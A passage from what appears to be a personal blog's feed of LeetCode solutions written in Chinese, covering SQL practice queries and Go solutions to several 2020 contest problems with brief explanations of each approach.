href="https://leetcode-cn.com/problems/not-boring-movies/" target="_blank" rel="noopener">620. 有趣的电影</a></h2><p>SQL架构</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> <span class="keyword">If</span> <span class="keyword">Not</span> <span class="keyword">Exists</span> cinema (<span class="keyword">id</span> <span class="built_in">int</span>, movie <span class="built_in">varchar</span>(<span class="number">255</span>), description <span class="built_in">varchar</span>(<span class="number">255</span>), rating <span class="built_in">float</span>(<span class="number">2</span>, <span class="number">1</span>))</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> cinema</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> cinema (<span class="keyword">id</span>, movie, description, rating) <span class="keyword">values</span> (<span class="string">'1'</span>, <span class="string">'War'</span>, <span class="string">'great 3D'</span>, <span class="string">'8.9'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> cinema (<span class="keyword">id</span>, movie, description, rating) <span class="keyword">values</span> (<span class="string">'2'</span>, <span class="string">'Science'</span>, <span class="string">'fiction'</span>, <span class="string">'8.5'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> cinema (<span class="keyword">id</span>, movie, description, rating) <span class="keyword">values</span> (<span class="string">'3'</span>, <span class="string">'irish'</span>, <span class="string">'boring'</span>, <span class="string">'6.2'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> cinema (<span class="keyword">id</span>, movie, description, rating) <span class="keyword">values</span> (<span class="string">'4'</span>, <span class="string">'Ice song'</span>, <span class="string">'Fantacy'</span>, <span class="string">'8.6'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> cinema (<span class="keyword">id</span>, movie, description, rating) <span class="keyword">values</span> (<span class="string">'5'</span>, <span class="string">'House card'</span>, <span class="string">'Interesting'</span>, <span class="string">'9.1'</span>)</span><br></pre></td></tr></table></figure><p>某城市开了一家新的电影院，吸引了很多人过来看电影。该电影院特别注意用户体验，专门有个 LED显示板做电影推荐，上面公布着影评和相关电影描述。</p><p>作为该电影院的信息部主管，您需要编写一个 SQL查询，找出所有影片描述为<strong>非</strong> <code>boring</code> (不无聊) 的并且 <strong>id 为奇数</strong> 的影片，结果请按等级 <code>rating</code> 排列。</p><p>例如，下表 <code>cinema</code>:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------+-----------+--------------+-----------+</span><br><span class="line">|   id    | movie     |  description |  rating   |</span><br><span class="line">+---------+-----------+--------------+-----------+</span><br><span class="line">|   1     | War       |   great 3D   |   8.9     |</span><br><span class="line">|   2     | Science   |   fiction    |   8.5     |</span><br><span class="line">|   3     | irish     |   boring     |   6.2     |</span><br><span class="line">|   4     | Ice song  |   Fantacy    |   8.6     |</span><br><span class="line">|   5     | House card|   Interesting|   9.1     |</span><br><span class="line">+---------+-----------+--------------+-----------+</span><br></pre></td></tr></table></figure><p>对于上面的例子，则正确的输出是为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------+-----------+--------------+-----------+</span><br><span class="line">|   id    | movie     |  description |  rating   |</span><br><span class="line">+---------+-----------+--------------+-----------+</span><br><span class="line">|   5     | House card|   Interesting|   9.1     |</span><br><span class="line">|   1     | War       |   great 3D   |   8.9     |</span><br><span class="line">+---------+-----------+--------------+-----------+</span><br></pre></td></tr></table></figure><h3 id="SQL-语句-12"><a href="#SQL-语句-12" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> *</span><br><span class="line"><span class="keyword">from</span> cinema</span><br><span class="line"><span class="keyword">where</span> description != <span class="string">'boring'</span> <span class="keyword">and</span> <span class="keyword">mod</span>(<span class="keyword">id</span>, <span class="number">2</span>) = <span class="number">1</span>  <span class="comment">-- id%2 = 1 / id&amp;1 = 1</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> rating <span class="keyword">desc</span></span><br></pre></td></tr></table></figure><h2 id="1148-文章浏览-I"><a href="#1148-文章浏览-I" class="headerlink" title="1148. 文章浏览 I"></a><a href="https://leetcode-cn.com/problems/article-views-i/" target="_blank" rel="noopener">1148. 文章浏览 I</a></h2><p>SQL架构</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> <span class="keyword">If</span> <span class="keyword">Not</span> <span class="keyword">Exists</span> Views (article_id <span class="built_in">int</span>, author_id <span class="built_in">int</span>, viewer_id <span class="built_in">int</span>, view_date <span class="built_in">date</span>)</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Views</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Views (article_id, author_id, viewer_id, view_date) <span class="keyword">values</span> (<span class="string">'1'</span>, <span class="string">'3'</span>, <span class="string">'5'</span>, <span class="string">'2019-08-01'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Views (article_id, author_id, viewer_id, view_date) <span class="keyword">values</span> (<span class="string">'1'</span>, <span class="string">'3'</span>, <span class="string">'6'</span>, <span class="string">'2019-08-02'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Views (article_id, author_id, viewer_id, view_date) <span class="keyword">values</span> (<span class="string">'2'</span>, <span class="string">'7'</span>, <span class="string">'7'</span>, <span class="string">'2019-08-01'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Views (article_id, author_id, viewer_id, view_date) <span class="keyword">values</span> (<span class="string">'2'</span>, <span class="string">'7'</span>, <span class="string">'6'</span>, <span class="string">'2019-08-02'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Views (article_id, author_id, viewer_id, view_date) <span class="keyword">values</span> (<span class="string">'4'</span>, <span class="string">'7'</span>, <span class="string">'1'</span>, <span class="string">'2019-07-22'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Views (article_id, author_id, viewer_id, view_date) <span class="keyword">values</span> (<span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'4'</span>, <span class="string">'2019-07-21'</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Views (article_id, author_id, viewer_id, view_date) <span class="keyword">values</span> (<span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'4'</span>, <span class="string">'2019-07-21'</span>)</span><br></pre></td></tr></table></figure><p><code>Views</code> 表：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+---------------+---------+</span><br><span class="line">| Column Name   | Type    |</span><br><span class="line">+---------------+---------+</span><br><span class="line">| article_id    | int     |</span><br><span class="line">| author_id     | int     |</span><br><span class="line">| viewer_id     | int     |</span><br><span class="line">| view_date     | date    |</span><br><span class="line">+---------------+---------+</span><br><span class="line">此表无主键，因此可能会存在重复行。</span><br><span class="line">此表的每一行都表示某人在某天浏览了某位作者的某篇文章。</span><br><span class="line">请注意，同一人的 author_id 和 viewer_id 是相同的。</span><br></pre></td></tr></table></figure><p>请编写一条 SQL 查询以找出所有浏览过自己文章的作者，结果按照 id 升序排列。查询结果的格式如下所示：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Views 表：</span><br><span class="line">+------------+-----------+-----------+------------+</span><br><span class="line">| article_id | author_id | viewer_id | view_date  |</span><br><span class="line">+------------+-----------+-----------+------------+</span><br><span class="line">| 1          | 3         | 5         | 2019-08-01 |</span><br><span class="line">| 1          | 3         | 6         | 2019-08-02 |</span><br><span class="line">| 2          | 7         | 7         | 2019-08-01 |</span><br><span class="line">| 2          | 7         | 6         | 2019-08-02 |</span><br><span class="line">| 4          | 7         | 1         | 2019-07-22 |</span><br><span class="line">| 3          | 4         | 4         | 2019-07-21 |</span><br><span class="line">| 3          | 4         | 4         | 2019-07-21 |</span><br><span class="line">+------------+-----------+-----------+------------+</span><br><span class="line"></span><br><span class="line">结果表：</span><br><span class="line">+------+</span><br><span class="line">| id   |</span><br><span class="line">+------+</span><br><span class="line">| 4    |</span><br><span class="line">| 7    |</span><br><span class="line">+------+</span><br></pre></td></tr></table></figure><h3 id="SQL-语句-13"><a href="#SQL-语句-13" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="SQL-语句-14"><a href="#SQL-语句-14" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><h3 id="SQL-语句-15"><a href="#SQL-语句-15" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><h3 id="SQL-语句-16"><a href="#SQL-语句-16" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><h3 id="SQL-语句-17"><a href="#SQL-语句-17" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><h3 id="SQL-语句-18"><a href="#SQL-语句-18" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><h3 id="SQL-语句-19"><a href="#SQL-语句-19" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><h3 id="SQL-语句-20"><a href="#SQL-语句-20" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><h3 id="SQL-语句-21"><a href="#SQL-语句-21" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><h3 id="SQL-语句-22"><a href="#SQL-语句-22" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><h3 id="SQL-语句-23"><a href="#SQL-语句-23" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><h3 id="SQL-语句-24"><a href="#SQL-语句-24" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><h3 id="SQL-语句-25"><a href="#SQL-语句-25" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><h3 id="SQL-语句-26"><a href="#SQL-语句-26" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><h3 id="SQL-语句-27"><a href="#SQL-语句-27" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><h3 id="SQL-语句-28"><a href="#SQL-语句-28" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><h3 id="SQL-语句-29"><a href="#SQL-语句-29" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><h3 id="SQL-语句-30"><a href="#SQL-语句-30" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><h3 id="SQL-语句-31"><a href="#SQL-语句-31" class="headerlink" title="SQL 语句"></a>SQL 语句</h3><h3 id="SQL-语句-32"><a href="#SQL-语句-32" class="headerlink" title="SQL 语句"></a>SQL 语句</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;以下题目从易到难。&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;1378-使用唯一标识码替换员工ID&quot;&gt;&lt;a href=&quot;#1378-使用唯一标识码替换员工ID&quot; class=&quot;headerlink&quot; title=&quot;1378. 使用唯一标识码替换员工ID&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="SQL" scheme="https://wywwzjj.top/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode Weekly Contest 179</title>
    <link href="https://wywwzjj.top/2020/03/08/LeetCode-Weekly-Contest-179/"/>
    <id>https://wywwzjj.top/2020/03/08/LeetCode-Weekly-Contest-179/</id>
    <published>2020-03-08T04:20:39.000Z</published>
    <updated>2020-03-22T10:11:48.063Z</updated>
    
    <content type="html"><![CDATA[<h2 id="生成每种字符都是奇数个的字符串"><a href="#生成每种字符都是奇数个的字符串" class="headerlink" title="生成每种字符都是奇数个的字符串"></a><a href="https://leetcode-cn.com/problems/generate-a-string-with-characters-that-have-odd-counts/" target="_blank" rel="noopener">生成每种字符都是奇数个的字符串</a></h2><p>总感觉这题应该叫我们来验证字符是否全为奇数个，结果反过来了？</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">generateTheString</span><span class="params">(n <span class="keyword">int</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> n%<span class="number">2</span> == <span class="number">1</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> strings.Repeat(<span class="string">"w"</span>, n)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> strings.Repeat(<span class="string">"w"</span>, n<span class="number">-1</span>) + <span class="string">"y"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="灯泡开关-III"><a href="#灯泡开关-III" class="headerlink" title="灯泡开关 III"></a><a href="https://leetcode-cn.com/problems/bulb-switcher-iii/" target="_blank" rel="noopener">灯泡开关 III</a></h2><h3 id="模拟一下"><a href="#模拟一下" class="headerlink" title="模拟一下"></a>模拟一下</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">numTimesAllBlue</span><span class="params">(light []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    ans := <span class="number">0</span></span><br><span class="line">    ok := <span class="built_in">make</span>([]<span class="keyword">bool</span>, <span class="built_in">len</span>(light)+<span class="number">1</span>)     <span class="comment">// 这个灯被点亮了</span></span><br><span class="line">    isBlue := <span class="built_in">make</span>([]<span class="keyword">bool</span>, <span class="built_in">len</span>(light)+<span class="number">1</span>) <span class="comment">// 这个灯是否为蓝色</span></span><br><span class="line">    isBlue[<span class="number">0</span>] = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">    maxLight := <span class="number">0</span> <span class="comment">// 所有点亮灯中最右的那个</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="keyword">range</span> light &#123;</span><br><span class="line">    now := light[i]</span><br><span class="line">    <span class="keyword">if</span> maxLight &lt; now &#123;</span><br><span class="line">    maxLight = now</span><br><span class="line">    &#125;</span><br><span class="line">    ok[now] = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">if</span> isBlue[now<span class="number">-1</span>] &#123;</span><br><span class="line">    isBlue[now] = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">for</span> j := now + <span class="number">1</span>; j &lt;= <span class="built_in">len</span>(light) &amp;&amp; ok[j]; j++ &#123; <span class="comment">// 右边的已点亮，将蓝色传递下去</span></span><br><span class="line">    isBlue[j] = <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> isBlue[maxLight] &#123; <span class="comment">// 点亮的灯中最右的都蓝色了，说明亮的灯全蓝了</span></span><br><span class="line">    ans++</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="简单方法"><a href="#简单方法" class="headerlink" title="简单方法"></a>简单方法</h3><p>比上面那种快了 4 ms。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">numTimesAllBlue</span><span class="params">(light []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    ans, maxLight := <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="keyword">range</span> light &#123;</span><br><span class="line">    now := light[i]</span><br><span class="line">    <span class="keyword">if</span> maxLight &lt; now &#123;</span><br><span class="line">    maxLight = now</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> maxLight &lt;= i + <span class="number">1</span> &#123;</span><br><span class="line">    ans++</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="通知所有员工所需的时间"><a href="#通知所有员工所需的时间" class="headerlink" title="通知所有员工所需的时间"></a><a href="https://leetcode-cn.com/problems/time-needed-to-inform-all-employees/" target="_blank" rel="noopener">通知所有员工所需的时间</a></h2><p>求树的带权深度最大值。每个人都找下老板，记录下其中的最大值即可。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">numOfMinutes</span><span class="params">(n <span class="keyword">int</span>, headID <span class="keyword">int</span>, manager []<span class="keyword">int</span>, informTime []<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    ans := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i := n<span class="number">-1</span>; i &gt;= <span class="number">0</span>; i-- &#123;</span><br><span class="line">    <span class="keyword">if</span> informTime[i] != <span class="number">0</span> &#123;  <span class="comment">// 非叶节点</span></span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">    &#125;</span><br><span class="line">    cnt, j := <span class="number">0</span>, i</span><br><span class="line">    <span class="keyword">for</span> manager[j] != <span class="number">-1</span> &#123;</span><br><span class="line">    j = manager[j]</span><br><span class="line">    cnt += informTime[j]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> cnt &gt; ans &#123;</span><br><span class="line">    ans = cnt</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="T-秒后青蛙的位置"><a href="#T-秒后青蛙的位置" class="headerlink" title="T 秒后青蛙的位置"></a><a href="https://leetcode-cn.com/problems/frog-position-after-t-seconds/" target="_blank" rel="noopener">T 秒后青蛙的位置</a></h2><p>总的来说，就是把父结点处的概率往子结点传。</p><p>有概率跳到 target 的只有两种情况：</p><ul><li>跳到 target，时间刚好用完；</li><li>跳到 target，时间没用完，但 target 是个叶节点，可以停留至时间消耗完。</li></ul><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> m [][]<span class="keyword">int</span></span><br><span class="line"><span class="keyword">var</span> ans <span class="keyword">float64</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">frogPosition</span><span class="params">(n <span class="keyword">int</span>, edges [][]<span class="keyword">int</span>, t <span class="keyword">int</span>, target <span class="keyword">int</span>)</span> <span class="title">float64</span></span> &#123;</span><br><span class="line">    m = <span class="built_in">make</span>([][]<span class="keyword">int</span>, n+<span class="number">1</span>)</span><br><span class="line">    ans = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="keyword">range</span> edges &#123;</span><br><span class="line">    m[edges[i][<span class="number">0</span>]] = <span class="built_in">append</span>(m[edges[i][<span class="number">0</span>]], edges[i][<span class="number">1</span>])</span><br><span class="line">    m[edges[i][<span class="number">1</span>]] = <span class="built_in">append</span>(m[edges[i][<span class="number">1</span>]], edges[i][<span class="number">0</span>])</span><br><span class="line">    &#125;</span><br><span class="line">    m[<span class="number">1</span>] = <span class="built_in">append</span>(m[<span class="number">1</span>], <span class="number">0</span>) <span class="comment">// 加条假边，根结点就不用另外判断了</span></span><br><span class="line">    dfs(<span class="number">1</span>, t, target, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">dfs</span><span class="params">(n, t, target, pre <span class="keyword">int</span>, probability <span class="keyword">float64</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> n == target &amp;&amp; (t == <span class="number">0</span> || (t &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">len</span>(m[n]) == <span class="number">1</span>)) &#123;</span><br><span class="line">    ans = probability</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="keyword">range</span> m[n] &#123;</span><br><span class="line">    now := m[n][i]</span><br><span class="line">    <span class="keyword">if</span> now != pre &#123; <span class="comment">// 不能往回走</span></span><br><span class="line">    dfs(now, t<span class="number">-1</span>, target, n, probability/<span class="keyword">float64</span>(<span class="built_in">len</span>(m[n])<span class="number">-1</span>))</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;生成每种字符都是奇数个的字符串&quot;&gt;&lt;a href=&quot;#生成每种字符都是奇数个的字符串&quot; class=&quot;headerlink&quot; title=&quot;生成每种字符都是奇数个的字符串&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode-cn.com/problems
      
    
    </summary>
    
    
      <category term="算法" scheme="https://wywwzjj.top/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode Weekly Contest 21（双周赛）</title>
    <link href="https://wywwzjj.top/2020/03/08/LeetCode-Weekly-Contest-21/"/>
    <id>https://wywwzjj.top/2020/03/08/LeetCode-Weekly-Contest-21/</id>
    <published>2020-03-07T16:30:38.000Z</published>
    <updated>2020-03-22T10:11:48.066Z</updated>
    
    <content type="html"><![CDATA[<h2 id="上升下降字符串"><a href="#上升下降字符串" class="headerlink" title="上升下降字符串"></a><a href="https://leetcode-cn.com/problems/increasing-decreasing-string/" target="_blank" rel="noopener">上升下降字符串</a></h2><p>先从小到大选一波，再从大到小选一波，重复上述步骤，直到选完。</p><p>直接模拟一下。（数据量大的话不要直接用 <code>+</code> 拼接，效率太低，而且浪费内存）</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sortString</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">    m := [<span class="number">26</span>]<span class="keyword">uint8</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="keyword">range</span> s &#123;</span><br><span class="line">    m[s[i]<span class="number">-97</span>]++</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> ans strings.Builder</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(s); &#123;</span><br><span class="line">    <span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">26</span>; j++ &#123;</span><br><span class="line">    <span class="keyword">if</span> m[j] &gt; <span class="number">0</span> &#123;</span><br><span class="line">    ans.WriteString(<span class="keyword">string</span>(j+<span class="number">97</span>))</span><br><span class="line">    m[j]--</span><br><span class="line">    i++</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> j := <span class="number">25</span>; j &gt;= <span class="number">0</span>; j-- &#123;</span><br><span class="line">    <span class="keyword">if</span> m[j] &gt; <span class="number">0</span> &#123;</span><br><span class="line">                ans.WriteString(<span class="keyword">string</span>(j+<span class="number">97</span>))</span><br><span class="line">    m[j]--</span><br><span class="line">    i++</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans.String()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="每个元音包含偶数次的最长子字符串"><a href="#每个元音包含偶数次的最长子字符串" class="headerlink" title="每个元音包含偶数次的最长子字符串"></a><a href="https://leetcode-cn.com/problems/find-the-longest-substring-containing-vowels-in-even-counts/" target="_blank" rel="noopener">每个元音包含偶数次的最长子字符串</a></h2><p>给你一个字符串 <code>s</code> ，请你返回满足以下条件的最长子字符串的长度：每个元音字母，即 ‘a’，’e’，’i’，’o’，’u’ ，在子字符串中都恰好出现了偶数次（含 0 次）。</p><p>这题卡了很久，如果暴力做的话肯定会超时，这个状态表示太妙了。</p><p>每个元音字母出现次数是否为偶数次可用 0、1 来表示，那么 5 个元音字母就 32 个状态，其中题目要求的全为偶数次的状态——<code>00000</code>。</p><p>如果 <code>s[0…i]</code> 与 <code>s[0…j]</code> 状态相同，那么 <code>s[i+1...j]</code> 的状态一定是 <code>00000</code>。</p><p>由于求的是最长子串，那么记录一下每个状态出现的第一次位置，再次出现该状态时做差取最大值即可。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">findTheLongestSubstring</span><span class="params">(s <span class="keyword">string</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    first := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">32</span>)</span><br><span class="line">    <span class="keyword">for</span> i := <span class="keyword">range</span> first &#123;</span><br><span class="line">    first[i] = math.MinInt32</span><br><span class="line">    &#125;</span><br><span class="line">    first[<span class="number">0</span>] = <span class="number">-1</span>  <span class="comment">// 特殊处理，如果出现 s[0...i] 状态为 0，那么其长度为 i + 1。</span></span><br><span class="line">    ans, cur := <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="keyword">range</span> s &#123;</span><br><span class="line">    <span class="keyword">switch</span> s[i] &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'a'</span>:</span><br><span class="line">    cur ^= <span class="number">1</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'e'</span>:</span><br><span class="line">    cur ^= <span class="number">2</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'i'</span>:</span><br><span class="line">    cur ^= <span class="number">4</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'o'</span>:</span><br><span class="line">    cur ^= <span class="number">8</span></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'u'</span>:</span><br><span class="line">    cur ^= <span class="number">16</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> first[cur] == math.MinInt32 &#123;</span><br><span class="line">    first[cur] = i</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> i-first[cur] &gt; ans &#123;</span><br><span class="line">    ans = i - first[cur]</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二叉树中的最长交错路径"><a href="#二叉树中的最长交错路径" class="headerlink" title="二叉树中的最长交错路径"></a><a href="https://leetcode-cn.com/problems/longest-zigzag-path-in-a-binary-tree/" target="_blank" rel="noopener">二叉树中的最长交错路径</a></h2><p>记录一下来源方向，交错路径加一，相同方向置零。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * type TreeNode struct &#123;</span></span><br><span class="line"><span class="comment"> *     Val int</span></span><br><span class="line"><span class="comment"> *     Left *TreeNode</span></span><br><span class="line"><span class="comment"> *     Right *TreeNode</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> maxLen <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">longestZigZag</span><span class="params">(root *TreeNode)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    maxLen = <span class="number">0</span></span><br><span class="line">    helper(root.Right, <span class="number">0</span>, <span class="literal">false</span>)</span><br><span class="line">    helper(root.Left, <span class="number">0</span>, <span class="literal">true</span>)</span><br><span class="line">    <span class="keyword">return</span> maxLen</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">helper</span><span class="params">(root *TreeNode, cnt <span class="keyword">int</span>, dir <span class="keyword">bool</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> root == <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    cnt++</span><br><span class="line">    <span class="keyword">if</span> cnt &gt; maxLen &#123;</span><br><span class="line">    maxLen = cnt</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> dir &#123;</span><br><span class="line">    helper(root.Right, cnt, <span class="literal">false</span>)</span><br><span class="line">    helper(root.Left, <span class="number">0</span>, <span class="literal">true</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    helper(root.Left, cnt, <span class="literal">true</span>)</span><br><span class="line">    helper(root.Right, <span class="number">0</span>, <span class="literal">false</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二叉搜索子树的最大键值和"><a href="#二叉搜索子树的最大键值和" class="headerlink" title="二叉搜索子树的最大键值和"></a><a href="https://leetcode-cn.com/problems/maximum-sum-bst-in-binary-tree/" target="_blank" rel="noopener">二叉搜索子树的最大键值和</a></h2><p><strong>给你一棵树的根结点，请在符合二叉搜索树要求的子树中求出其最大键值和。</strong></p><p>首先得判断该子树是否为二叉搜索树，记录下键值和，还要尽可能减少重复计算。</p><p>回顾一下，如何验证二叉搜索树。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isValidBST</span><span class="params">(root *TreeNode)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> helper(root, <span class="literal">nil</span>, <span class="literal">nil</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 边界法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">helper</span><span class="params">(root, min, max *TreeNode)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> root == <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (min != <span class="literal">nil</span> &amp;&amp; root.Val &lt;= min.Val) || (max != <span class="literal">nil</span> &amp;&amp; root.Val &gt;= max.Val) &#123;</span><br><span 